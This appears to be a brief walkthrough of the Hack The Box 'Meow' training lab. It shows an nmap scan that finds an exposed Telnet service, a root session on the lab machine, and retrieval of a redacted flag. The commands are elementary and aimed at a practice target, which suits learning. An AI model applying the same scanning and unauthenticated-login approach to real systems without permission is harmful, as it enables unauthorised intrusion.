## 🐱 HTB Starting Point: Meow  
**Level**: Easy  
**Date**: June 30, 2025  
**Goal**: Gain access to a machine running an exposed Telnet service and retrieve the user flag.

---

### 🧰 Tools  
- `nmap`  
- `telnet`  
- Basic Linux commands (`whoami`, `hostname`, `cat`)  

---

### 🧭 Steps  

1. 🔎 **Scan the machine** using `nmap` to discover open ports and services:
   ```bash
   nmap -sC -sV -Pn -n -T4 10.129.X.X
   ```

### Output
    PORT   STATE SERVICE VERSION
    23/tcp open  telnet  Linux telnetd

### ✅ Confirm access and environment:
    whoami
    # root

    hostname
    # meow

### 📁 List files and retrieve the flag:
    ls
    # flag.txt

    cat flag.txt
    # HTB{REDACTED}

### 💣 Payloads Used
    telnet 10.129.X.X
    whoami
    hostname
    cat flag.txt
